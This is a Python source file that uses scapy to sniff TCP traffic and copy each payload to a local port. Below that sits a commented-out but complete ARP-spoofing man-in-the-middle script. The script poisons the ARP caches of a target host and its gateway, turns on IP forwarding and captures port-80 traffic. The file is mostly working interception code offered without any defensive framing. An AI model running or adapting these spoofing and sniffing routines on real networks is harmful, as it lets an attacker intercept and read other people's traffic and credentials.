from scapy.all import sniff, IP, TCP, Raw
import argparse
import socket

def test(packet):
    if packet.haslayer(TCP) and packet.haslayer(Raw):
        original_payload = packet[Raw].load.decode('utf-8', errors='ignore')
        print(f"Intercepted packet with payload: {original_payload}")
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect(("127.0.0.1", 12345))
            print(f"Sending it to port 12345")
            sock.sendall(original_payload.encode('utf-8'))
            sock.close()
            print("payload sent successfully.")
        except Exception as e:
            print(f"Failed to send modified payload to port 12345: {e}")
    else:
        print("Intercepted packet has no payload or is not TCP, skipping.")

def best(interface, filter_str):
    print(f"Starting packet interception on {interface}")
    sniff(iface=interface, filter=filter_str, prn=test, store=False)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Packet Copy and Redirect Tool (TCP)")
    parser.add_argument("--interface", required=True, help="Network interface (e.g., lo)")
    parser.add_argument("--filter", default="tcp and not dst port 12345", 
                        help="BPF filter (default: tcp and dst port 1234 and dst host 127.0.0.1)")
    args = parser.parse_args()
    try:
        best(args.interface, args.filter)
    except Exception as e:
        print(f"Error: {e}")



# import scapy.all as scapy
# import os
# import platform

# def get_mac(ip, interface):
#     try:
#         arp_request = scapy.ARP(pdst=ip)
#         broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
#         arp_packet = broadcast / arp_request
#         answered_list = scapy.srp(arp_packet, timeout=2, iface=interface, verbose=False)[0]
#         return answered_list[0][1].hwsrc if answered_list else None
#     except:
#         return None

# def send_arp_reply(target_ip, source_ip, interface, hwsrc=None, count=1):
#     target_mac = get_mac(target_ip, interface)
#     if not target_mac:
#         print(f"Could not get MAC for {target_ip}....")
#         return False
#     action = "Spoofing" if hwsrc is None else "Restoring"
#     print(f"{action} {source_ip} to {target_ip} (MAC: {target_mac})...")
#     try:
#         packet = scapy.Ether(dst=target_mac) / scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=source_ip, hwsrc=hwsrc)
#         scapy.send(packet, iface=interface, count=count, verbose=False)
#         actual_hwsrc = packet[scapy.ARP].hwsrc if hwsrc is None else hwsrc
#         print(f"Sent ARP reply: {source_ip} is at {actual_hwsrc} to {target_ip} ({count} times)")
#         return True
#     except Exception as e:
#         print(f"Error: {e}")
#         return False

# def forwarding():
#     os_name = platform.system().lower()
#     try:
#         if os_name == "linux":
#             os.system("sysctl -w net.ipv4.ip_forward=1")
#         elif os_name == "windows":
#             os.system("netsh interface ipv4 set interface \"Ethernet\" forwarding=enabled")
#         print("Enabled IP forwarding")
#     except:
#         print("Error enabling IP forwarding")

# def sniff_packets(interface):
#     print("sniffing Starting...")
#     try:
#         scapy.sniff(iface=interface, filter="tcp port 80", prn=lambda packet: print(f"[*] Intercepted packet: {packet.summary()}"), store=False)
#     except Exception as e:
#         print(f"Error: {e}")

# interface = "Ethernet"  # Change to your interface
# target_ip = "192.168.1.4"  # Target device to trick
# gateway_ip = "192.168.1.1"  # IP to spoof (e.g., gateway)

# if interface:
#     pass
# else:
#     print(f"Interface dosen't exist: avaliable:\n{scapy.get_if_list()}")
#     exit(1)

# target_mac = get_mac(target_ip, interface)
# gateway_mac = get_mac(gateway_ip, interface)

# if not target_mac or not gateway_mac:
#     exit(1)

# forwarding()
# print(f"Starting MITM attack on {interface}...")

# if not send_arp_reply(target_ip, gateway_ip, interface) or not send_arp_reply(gateway_ip, target_ip, interface):
#     print("[!] Spoofing failed...")
#     exit(1)

# try:
#     sniff_packets(interface)
# except KeyboardInterrupt:
#     print("\nStopping ARP spoofing...")
#     exit(1)
# finally:
#     send_arp_reply(target_ip, gateway_ip, interface)
#     send_arp_reply(gateway_ip, target_ip, interface)
#     print(f"ARP tables restored.")